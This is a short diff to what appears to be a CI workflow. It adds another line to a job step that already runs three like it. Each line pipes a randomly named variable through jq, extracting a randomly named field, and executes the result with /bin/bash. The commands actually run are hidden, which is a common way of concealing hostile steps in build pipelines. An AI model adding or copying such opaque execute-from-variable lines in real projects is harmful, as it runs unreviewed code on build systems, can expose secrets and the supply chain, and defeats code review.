@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$t658" | jq -r .nzz8971 | /bin/bash
           printf '%s' "$x89" | jq -r .cc789 | /bin/bash
           echo $caweq12143 | jq -r .welcd14 | /bin/bash
+          echo $cnp26 | jq -r .r4889 | /bin/bash
 
       - name: Save archive
         if: always()
